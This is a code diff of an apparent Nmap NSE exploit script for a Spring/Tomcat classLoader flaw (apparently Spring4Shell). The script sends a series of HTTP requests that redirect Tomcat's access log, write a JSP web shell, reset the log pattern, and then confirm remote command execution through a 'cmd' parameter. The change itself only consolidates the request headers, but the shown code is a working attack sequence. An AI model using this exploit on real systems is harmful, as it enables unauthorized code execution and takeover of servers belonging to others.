@@ -52,11 +52,7 @@ action = function(host, port)
     return("ERROR: To use a 'assertion' argument, also define an 'command' argument.")
   end
 
-  local post_headers = {
-    ["content-type"] = "application/x-www-form-urlencoded"
-  }
-
-  local get_headers = {
+  local headers = {
       ["prefix"] = "<%",
       ["suffix"] = "%>//",
       ["c"] = "Runtime",
@@ -78,30 +74,30 @@ action = function(host, port)
   if shortport.http(host, port) then
     -- First POST request
     stdnse.debug("First post request")
-    local response = http.generic_request(host, port.number, "POST", endpoint, { header = post_headers, content = file_date_data, no_cache = true })
+    local response = http.generic_request(host, port.number, "POST", endpoint, { header = headers, content = file_date_data, no_cache = true })
 
     -- Change the tomcat log location variables --
     stdnse.debug("Change the tomcat log location variables")
-    local response = http.generic_request(host, port.number, "POST", endpoint, { header = post_headers, content = payload, no_cache = true })
+    local response = http.generic_request(host, port.number, "POST", endpoint, { header = headers, content = payload, no_cache = true })
     stdnse.sleep(3)
 
     -- Write the web shell --
     stdnse.debug("Write the web shell")
-    local response = http.generic_request(host, port.number, "GET", endpoint, { header = get_headers, no_cache = true })
+    local response = http.generic_request(host, port.number, "GET", endpoint, { header = headers, no_cache = true })
     stdnse.sleep(1)
 
     -- Reset the pattern
     stdnse.debug("Reset the pattern")
     local pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
-    local response = http.generic_request(host, port.number, "POST", endpoint, { header = post_headers, content = pattern_data, no_cache = true })
+    local response = http.generic_request(host, port.number, "POST", endpoint, { header = headers, content = pattern_data, no_cache = true })
 
     -- Send second payload
     stdnse.debug("Send second payload")
-    local response = http.generic_request(host, port.number, "POST", endpoint, { header = post_headers, content = second_payload, no_cache = true })
+    local response = http.generic_request(host, port.number, "POST", endpoint, { header = headers, content = second_payload, no_cache = true })
 
     -- Verify that RCE is working on the server
     stdnse.debug("Verify that RCE is working on the server")
-    local response = http.generic_request(host, port.number, "GET", endpoint .. "/" .. filename .. ".jsp?pwd=j&cmd=" .. command, { header = get_headers, content = pattern_data, no_cache = true })
+    local response = http.generic_request(host, port.number, "GET", endpoint .. "/" .. filename .. ".jsp?pwd=j&cmd=" .. command, { header = headers, content = pattern_data, no_cache = true })
     local response_body = response.body
     local status = response.status
 
